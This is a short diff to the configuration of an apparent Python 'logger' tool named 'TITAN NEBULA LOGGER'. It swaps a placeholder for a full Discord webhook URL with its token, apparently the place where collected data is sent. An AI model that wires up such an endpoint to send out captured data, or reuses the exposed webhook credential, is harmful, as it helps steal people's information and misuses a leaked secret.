@@ -7,7 +7,7 @@ import struct
 
 # --- CONFIGURATION ---
 config = {
-    "webhook": "WEBHOOK_URL_NI_BURAYA_YAZ",  # Kendi webhook URL'ini yaz
+    "webhook": "https://discord.com/api/webhooks/1458566674302238923/0EPCSiG8KU6QcDoFcT0Ugc6BN_fGX_7K6KsXtflSlkKV4ZPH9zSHx3bnirPb0bWDowEk",  # Kendi webhook URL'ini yaz
     "username": "TITAN NEBULA LOGGER",
     "color": 0x00FFFF
 }
